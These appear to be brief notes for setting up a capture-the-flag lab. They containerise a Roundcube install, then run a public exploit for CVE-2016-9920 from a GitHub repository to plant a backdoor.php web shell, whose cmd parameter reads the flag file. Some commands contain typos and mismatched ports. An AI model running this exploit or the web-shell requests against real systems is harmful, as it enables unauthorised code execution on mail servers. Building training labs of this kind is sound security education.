https://github.com/t0kx/exploit-CVE-2016-9920.git
 
Create flag.txt and put bsb17_5bb708a5f6fcb46badf46e254fa21919
Modify Docker with flag.txt to copy flag.txt to /etc/flag.txt
Docker build -t roundcube .
docker run -d -p 8085:80 rounecube:latest 
 
Docker run -rm -it p8085:80 roundcube:latest
 
Execute ./exploit.py --host 10.1.119.219 --user username --pwd password --path roundcube --www_path "/var/www/html/roundcube"
http://ip:8080/roundcub/backdoor.php?cmd=cat%20/flag.txt
 
 
Run the exploit python script from the git repo.. 
http://10.1.119.219:8085/roundcube/backdoor.php?cmd=cat%20/etc/flag.txt
